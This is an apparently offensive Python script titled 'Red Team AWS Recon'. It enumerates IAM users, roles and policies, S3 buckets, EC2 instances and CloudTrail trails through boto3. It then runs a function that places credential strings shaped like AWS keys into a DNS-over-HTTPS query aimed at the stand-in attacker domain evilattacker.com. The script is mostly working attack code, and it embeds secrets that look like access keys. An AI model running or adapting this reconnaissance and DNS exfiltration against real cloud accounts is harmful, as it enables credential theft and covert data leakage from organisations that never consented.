import boto3
from botocore.exceptions import ClientError
import urllib.parse
import requests

def get_sts_identity():
    sts = boto3.client('sts')
    print("[*] Caller Identity:")
    print(sts.get_caller_identity())
    print("-" * 60)

def list_iam():
    iam = boto3.client('iam')
    print("[*] IAM Users:")
    print([user['UserName'] for user in iam.list_users()['Users']])

    print("[*] IAM Roles:")
    print([role['RoleName'] for role in iam.list_roles()['Roles']])

    print("[*] IAM Policies:")
    print([policy['PolicyName'] for policy in iam.list_policies(Scope='Local')['Policies']])
    print("-" * 60)

def list_s3_buckets():
    s3 = boto3.client('s3')
    try:
        print("[*] S3 Buckets:")
        buckets = s3.list_buckets()['Buckets']
        for bucket in buckets:
            name = bucket['Name']
            print(f"  - {name}")
            try:
                loc = s3.get_bucket_location(Bucket=name)['LocationConstraint']
                print(f"    Region: {loc}")
            except:
                print("    Could not get region")
    except ClientError as e:
        print("    [!] Error listing S3 buckets:", e)
    print("-" * 60)

def describe_ec2_instances():
    ec2 = boto3.client('ec2')
    print("[*] EC2 Instances:")
    try:
        reservations = ec2.describe_instances()['Reservations']
        for res in reservations:
            for inst in res['Instances']:
                print(f"  - ID: {inst['InstanceId']} | Type: {inst['InstanceType']} | State: {inst['State']['Name']}")
    except ClientError as e:
        print("    [!] Error describing EC2 instances:", e)
    print("-" * 60)

def describe_cloudtrail():
    cloudtrail = boto3.client('cloudtrail')
    print("[*] CloudTrail Trails:")
    try:
        trails = cloudtrail.describe_trails()['trailList']
        for trail in trails:
            print(f"  - Name: {trail['Name']} | S3 Bucket: {trail.get('S3BucketName', 'N/A')}")
    except ClientError as e:
        print("    [!] Error describing CloudTrail trails:", e)
    print("-" * 60)
# =============================
# DNS-over-HTTPS Exfiltration
# =============================
def exfiltrate_doh():
    print("[*] Simulating DoH Exfiltration")
    secret_data = "AccessKey=ASIARUKKLI2ICCMHA6VX&SecretKey=6BRgwPUdUUUKOhCV88zifwxrNM"
    encoded = urllib.parse.quote(secret_data)
    exfil_url = f"https://dns.google.com/resolve?name={encoded}.evilattacker.com&type=TXT"

    try:
        res = requests.get(exfil_url)
        print(f"[+] Exfiltration via DoH sent to: {exfil_url}")
        print(f"[+] HTTP Status: {res.status_code}")
    except Exception as e:
        print(f"[!] DoH exfiltration failed: {e}")
    print("-" * 60)

if __name__ == "__main__":
    print("=== Red Team AWS Recon ===")
    get_sts_identity()
    list_iam()
    list_s3_buckets()
    describe_ec2_instances()
    describe_cloudtrail()
    exfiltrate_doh()
